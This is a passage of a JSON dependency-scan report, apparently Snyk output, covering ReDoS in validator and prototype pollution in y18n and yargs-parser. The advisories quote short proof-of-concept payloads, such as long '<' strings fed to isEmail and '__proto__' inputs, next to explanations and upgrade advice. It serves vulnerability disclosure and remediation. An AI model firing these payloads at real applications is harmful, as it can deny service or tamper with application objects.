excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `validator` to version 13.6.0 or higher.\\n## References\\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1598)\\n- [GitHub PR](https://github.com/validatorjs/validator.js/pull/1651)\\n\",\n  \"disclosureTime\": \"2021-04-05T13:11:19Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"13.6.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-VALIDATOR-1090601\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-08-08T13:56:55.041865Z\",\n  \"moduleName\": \"validator\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"validator\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-04-26T16:18:43.450928Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/validatorjs/validator.js/issues/1598\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/validatorjs/validator.js/pull/1651\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<13.6.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"validator@13.5.2\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"validator@13.6.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"validator\",\n  \"version\": \"13.5.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , validator@13.5.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "SNYK-JS-VALIDATOR-1090602",
          "desc": "## Overview\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `isEmail` function.\r\n\r\n### PoC\r\n```\r\nvar validator = require(\"validator\")\r\nfunction build_attack(n) {\r\n\tvar ret = \"\"\r\n\tfor (var i = 0; i < n; i++) {\r\n\t\tret += \"<\"\r\n\t}\r\n\r\n\treturn ret+\"\";\r\n}\r\nfor(var i = 1; i <= 50000; i++) {\r\n    if (i % 10000 == 0) {\r\n        var time = Date.now();\r\n        var attack_str = build_attack(i)\r\n        validator.isEmail(attack_str,{ allow_display_name: true })\r\n        var time_cost = Date.now() - time;\r\n        console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n   }\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `validator` to version 13.6.0 or higher.\n## References\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1597)\n- [GitHub PR](https://github.com/validatorjs/validator.js/pull/1651)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-04-05T13:15:56.238780Z\",\n  \"credit\": [\n    \"Yeting Li\"\n  ],\n  \"cvssScore\": 5.3,\n  \"description\": \"## Overview\\n[validator](https://www.npmjs.com/package/validator) is a library of string validators and sanitizers.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `isEmail` function.\\r\\n\\r\\n### PoC\\r\\n```\\r\\nvar validator = require(\\\"validator\\\")\\r\\nfunction build_attack(n) {\\r\\n\\tvar ret = \\\"\\\"\\r\\n\\tfor (var i = 0; i < n; i++) {\\r\\n\\t\\tret += \\\"<\\\"\\r\\n\\t}\\r\\n\\r\\n\\treturn ret+\\\"\\\";\\r\\n}\\r\\nfor(var i = 1; i <= 50000; i++) {\\r\\n    if (i % 10000 == 0) {\\r\\n        var time = Date.now();\\r\\n        var attack_str = build_attack(i)\\r\\n        validator.isEmail(attack_str,{ allow_display_name: true })\\r\\n        var time_cost = Date.now() - time;\\r\\n        console.log(\\\"attack_str.length: \\\" + attack_str.length + \\\": \\\" + time_cost+\\\" ms\\\")\\r\\n   }\\r\\n}\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `validator` to version 13.6.0 or higher.\\n## References\\n- [GitHub Issue](https://github.com/validatorjs/validator.js/issues/1597)\\n- [GitHub PR](https://github.com/validatorjs/validator.js/pull/1651)\\n\",\n  \"disclosureTime\": \"2021-04-05T13:14:43Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"13.6.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-VALIDATOR-1090602\",\n  \"identifiers\": {\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-08-08T13:56:55.044794Z\",\n  \"moduleName\": \"validator\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"validator\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-04-26T16:18:42.989822Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/validatorjs/validator.js/issues/1597\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/validatorjs/validator.js/pull/1651\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<13.6.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"validator@13.5.2\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"validator@13.6.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"validator\",\n  \"version\": \"13.5.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , validator@13.5.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-7774"
            ],
            "ghsaid": [
              "c4w7-xm78-47vh"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-Y18N-1021887",
          "desc": "## Overview\n[y18n](https://www.npmjs.com/package/y18n) is a the bare-bones internationalization library used by yargs\n\nAffected versions of this package are vulnerable to Prototype Pollution. PoC by po6ix:\r\n```\r\nconst y18n = require('y18n')();\r\n \r\ny18n.setLocale('__proto__');\r\ny18n.updateLocale({polluted: true});\r\n\r\nconsole.log(polluted); // true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `y18n` to version 3.2.2, 4.0.1, 5.0.5 or higher.\n## References\n- [GitHub Issue](https://github.com/yargs/y18n/issues/96)\n- [GitHub PR](https://github.com/yargs/y18n/pull/108)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-10-25T14:27:16.715665Z\",\n  \"credit\": [\n    \"po6ix\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[y18n](https://www.npmjs.com/package/y18n) is a the bare-bones internationalization library used by yargs\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. PoC by po6ix:\\r\\n```\\r\\nconst y18n = require('y18n')();\\r\\n \\r\\ny18n.setLocale('__proto__');\\r\\ny18n.updateLocale({polluted: true});\\r\\n\\r\\nconsole.log(polluted); // true\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `y18n` to version 3.2.2, 4.0.1, 5.0.5 or higher.\\n## References\\n- [GitHub Issue](https://github.com/yargs/y18n/issues/96)\\n- [GitHub PR](https://github.com/yargs/y18n/pull/108)\\n\",\n  \"disclosureTime\": \"2020-10-25T14:24:22Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.2.2\",\n    \"4.0.1\",\n    \"5.0.5\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-Y18N-1021887\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-7774\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-c4w7-xm78-47vh\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-05-02T13:23:15.353267Z\",\n  \"moduleName\": \"y18n\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"y18n\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-11-10T15:27:28Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/yargs/y18n/issues/96\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/yargs/y18n/pull/108\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.2.2\",\n      \">=4.0.0 <4.0.1\",\n      \">=5.0.0 <5.0.5\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"yargs@11.1.0\",\n    \"y18n@3.2.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"yargs@11.1.0\",\n    \"y18n@3.2.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"y18n\",\n  \"version\": \"3.2.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , yargs@11.1.0 , y18n@3.2.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , yargs@13.3.2 , y18n@4.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , yargs@15.4.1 , y18n@4.0.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-7608"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-YARGSPARSER-560381",
          "desc": "## Overview\n[yargs-parser](https://www.npmjs.com/package/yargs-parser) is a mighty option parser used by yargs.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.\r\n\r\nOur research team checked several attack vectors to verify this vulnerability:\r\n\r\n1. It could be used for [privilege escalation](https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832).\r\n2. The library could be used to parse user input received from different sources:\r\n    - terminal emulators\r\n    - system calls from other code bases\r\n    - CLI RPC servers\r\n\r\n## PoC by Snyk\r\n```\r\nconst parser = require(\"yargs-parser\");\r\nconsole.log(parser('--foo.__proto__.bar baz'));\r\nconsole.log(({}).bar);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `yargs-parser` to version 5.0.1, 13.1.2, 15.0.1, 18.1.1 or higher.\n## References\n- [Command Injection PoC](https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832)\n- [GitHub Fix Commit](https://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2)\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-03-16T16:41:36.590728Z\",\n  \"credit\": [\n    \"Snyk Security Team\"\n  ],\n  \"cvssScore\": 5.6,\n  \"description\": \"## Overview\\n[yargs-parser](https://www.npmjs.com/package/yargs-parser) is a mighty option parser used by yargs.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.\\r\\n\\r\\nOur research team checked several attack vectors to verify this vulnerability:\\r\\n\\r\\n1. It could be used for [privilege escalation](https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832).\\r\\n2. The library could be used to parse user input received from different sources:\\r\\n    - terminal emulators\\r\\n    - system calls from other code bases\\r\\n    - CLI RPC servers\\r\\n\\r\\n## PoC by Snyk\\r\\n```\\r\\nconst parser = require(\\\"yargs-parser\\\");\\r\\nconsole.log(parser('--foo.__proto__.bar baz'));\\r\\nconsole.log(({}).bar);\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as 